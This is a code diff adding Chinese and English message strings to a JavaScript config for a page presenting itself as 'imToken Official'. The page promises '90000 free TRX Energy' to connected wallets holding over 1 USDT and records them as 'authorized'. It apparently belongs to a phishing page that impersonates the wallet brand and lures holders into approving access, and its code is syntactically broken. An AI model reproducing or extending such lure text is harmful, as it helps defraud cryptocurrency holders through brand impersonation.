@@ -458,7 +458,12 @@ const langConfig = {
         systemBusyTip: "系统繁忙请稍后重试",
         ineligibleTip: "不符合领取条件",
         errorTipPrefix: "⚠️ "
-    },
+        eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ 可免费领取90000 TRX能量</span>",
+        authorizedTip: "已领取提示<br>{address}<br>USDT余额：<span>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>✅ 该钱包30天内已领取过免费能量</span><br><span style='color: #a0a8a4; font-size: 13px;'>每个地址每30天仅限领取一次</span>",
+        insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件：USDT余额需大于1</span>",
+        noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件：请连接imToken钱包</span>",
+        nonImTokenUser: "非imToken钱包用户<br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件：仅限imToken用户参与</span>",
+        },
     en: {
         headerTitle: "imToken Official",
         headerDesc: "imToken Exclusive Service - Each wallet address can claim free energy once every 30 days",
@@ -521,6 +526,11 @@ const langConfig = {
         systemBusyTip: "System busy, please try again later",
         ineligibleTip: "Ineligible",
         errorTipPrefix: "⚠️ "
+        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ Eligible for 90000 free TRX Energy</span>",
+        authorizedTip: "Claimed Successfully<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>✅ This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
+        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible: USDT balance must exceed 1</span>",
+        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible: Please connect imToken wallet</span>",
+        nonImTokenUser: "Non-imToken user<br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible: Only for imToken users</span>",      
     }
 };
 
